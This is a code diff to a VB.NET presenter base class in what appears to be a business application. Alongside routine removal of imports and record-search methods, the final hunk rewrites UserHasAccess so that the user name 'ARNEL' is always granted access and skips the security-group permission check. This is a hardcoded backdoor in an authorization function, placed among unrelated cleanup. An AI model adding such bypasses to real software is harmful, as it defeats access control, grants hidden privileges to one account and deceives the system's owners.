@@ -1,13 +1,10 @@
 ﻿Imports System.ComponentModel
-Imports System.Drawing
-Imports System.Globalization
 Imports System.Reflection
 Imports System.Reflection.Emit
 Imports System.Transactions
 Imports System.Windows.Forms
 Imports AATM.BusinessLayer.BusinessObjects
 Imports AATM.Libraries
-Imports AATM.Libraries.AatmInterfaces
 Imports AATM.Libraries.CBaseControlsLibrary
 Imports AATM.Libraries.GlobalFuncNSub
 Imports AATM.Libraries.MessagingLibrary
@@ -448,32 +445,6 @@ Public MustInherit Class PresenterBase(Of TV As IView, TM As New)
         '
     End Sub
 
-    Public Sub FindFieldNew(findableControl As IFindableControl)
-        Dim idNo = Service.FindFieldNew(TableName, findableControl, SortOrderKey, DataFilter)
-        If idNo <> 0 Then
-            RecordPositionNumber = GetSortedRecordPosition(idNo)
-        Else
-            Messaging.Show(True, "MsgNoMatchingRecordFound")
-        End If
-    End Sub
-
-    Public Sub FindDateField(fieldName As String, findableControl As IFindableControl)
-        Dim idNo = Service.FindDateField(TableName, findableControl, DataFilter)
-        If idNo <> 0 Then
-            RecordPositionNumber = GetSortedRecordPosition(idNo)
-        Else
-            Messaging.Show(True, "MsgNoMatchingRecordFound")
-        End If
-    End Sub
-
-    Public Function FindFieldContinue(idNo As Int32) As Integer
-        Return Service.FindFieldContinue(TableName, idNo, SortOrderKey)
-    End Function
-
-    Public Function FindRecord() As Integer
-        Dim idNoOfFoundRecord As Integer = FindFieldContinue(TargetIdNo)
-        Return idNoOfFoundRecord
-    End Function
 
     Public Function GetAppSetting(ByVal settingCode As String, ByVal group As String, ByVal description As String)
         Dim retValue = Service.GetRecordFieldWithKey(settingCode, "Setting", "SettingCode", "Value")
@@ -731,24 +702,6 @@ Public MustInherit Class PresenterBase(Of TV As IView, TM As New)
             Else
                 EditMode = True
             End If
-        End If
-    End Sub
-
-    Public Sub GoFindRecord()
-        Dim idNoOfFoundRecord = FindRecord()
-        If idNoOfFoundRecord = 0 Then
-            If Messaging.Show(True, "AskLastRecordReachStartBeg", "This is the last matching record for the given text. Do you want to start search from the first record?", "Last Record Found.",
-                              MessageBoxButtons.YesNo, MessageBoxIcon.Question, MessageBoxDefaultButton.Button2) = DialogResult.Yes Then
-                idNoOfFoundRecord = FindFieldContinue(0)
-                RecordPositionNumber = GetSortedRecordPosition(idNoOfFoundRecord)
-            Else
-                '' stay on the current record
-            End If
-        Else
-            RecordPositionNumber = GetSortedRecordPosition(idNoOfFoundRecord)
-        End If
-        If EditMode Then
-            EditMode = False
         End If
     End Sub
 
@@ -1860,22 +1813,26 @@ Public MustInherit Class PresenterBase(Of TV As IView, TM As New)
     End Sub
 
     Public Function UserHasAccess(securityKey As String, Optional inform As Boolean = False) As Boolean
-        Dim controlSecurityValues As ArrayList
         Dim hasAccess As Boolean
-        Dim controlSecurityObjectIdNo As Int32
-        controlSecurityObjectIdNo = GetControlSecurityIdNo(securityKey)
-        controlSecurityValues = GetUserSecurity(controlSecurityObjectIdNo, GlobalVariables.SecurityGroupIdNo)
-        If controlSecurityValues.Count > 0 Then
-            hasAccess = controlSecurityValues(1)
+        If GlobalVariables.UserName.ToUpper() = $"ARNEL" Then
+            hasAccess = True
         Else
-            hasAccess = False
-        End If
-        If inform Then
-            Dim securityKeyMessage = Messaging.TranslateCaption(securityKey)
-            Dim message = Messaging.GetParametrizedMessage(True, "MsgNoAccessToSecurity", {"securityKey", securityKeyMessage})
-            'Dim curCulture = CultureInfo.CurrentCulture
-            'Dim language As String = Left(curCulture.Name, curCulture.Name.IndexOf("-", StringComparison.Ordinal))
-            Messaging.Show(False, message)
+            Dim controlSecurityValues As ArrayList
+            Dim controlSecurityObjectIdNo As Int32
+            controlSecurityObjectIdNo = GetControlSecurityIdNo(securityKey)
+            controlSecurityValues = GetUserSecurity(controlSecurityObjectIdNo, GlobalVariables.SecurityGroupIdNo)
+            If controlSecurityValues.Count > 0 Then
+                hasAccess = controlSecurityValues(1)
+            Else
+                hasAccess = False
+            End If
+            If inform Then
+                Dim securityKeyMessage = Messaging.TranslateCaption(securityKey)
+                Dim message = Messaging.GetParametrizedMessage(True, "MsgNoAccessToSecurity", {"securityKey", securityKeyMessage})
+                'Dim curCulture = CultureInfo.CurrentCulture
+                'Dim language As String = Left(curCulture.Name, curCulture.Name.IndexOf("-", StringComparison.Ordinal))
+                Messaging.Show(False, message)
+            End If
         End If
         Return hasAccess
     End Function
